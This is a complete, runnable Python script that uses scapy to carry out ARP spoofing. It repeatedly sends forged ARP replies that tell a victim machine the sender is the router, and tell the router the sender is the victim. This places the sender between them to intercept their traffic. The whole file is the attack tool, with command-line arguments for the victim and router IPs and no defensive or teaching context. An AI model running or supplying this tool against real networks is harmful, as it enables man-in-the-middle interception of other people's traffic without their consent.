#!/usr/bin/env python3
import scapy.all as scapy
import time
import argparse


def get_mac(ip):
    """Get target IP MAC address"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_bdc = broadcast/arp_request
    answered, unanswered = scapy.srp(arp_request_bdc, timeout=1, verbose=False)
    try:
        return answered[0][1].hwsrc
    except IndexError:
        return get_mac(ip)

def spoof(target_ip, spoof_ip):
    """Send ARP spoof packet"""
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(
        op=2,              # is-at packet
        pdst=target_ip,    # IP of target computer
        hwdst=target_mac,  # MAC of target computer
        psrc=spoof_ip)     # IP we are trying to impersonate
    scapy.send(packet, verbose=False)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-tip', dest='victim_ip', help='Target machine\'s IP.', required=True)
    parser.add_argument('-rip', dest='router_ip', help='Spoof IP.', required=True)
    parser.add_argument('-t', dest='timer', type=float, default=2)
    args = parser.parse_args()
    sent_packets_count = 0
    print(f'[+] Telling {args.victim_ip} we are {args.router_ip}.\n'
          f'[+] Telling {args.router_ip} we are {args.victim_ip}.')
    while True:
        try:
            # Tell victim we are the router
            spoof(target_ip=args.victim_ip, spoof_ip=args.router_ip)
            # Tell router we are the victim
            spoof(target_ip=args.router_ip, spoof_ip=args.victim_ip)
            sent_packets_count += 2
            print('\r[+] Sent {} packets.'.format(sent_packets_count), end='')
            time.sleep(args.timer)
        except KeyboardInterrupt:
            print('\n\n[x] Stopping.')
            break
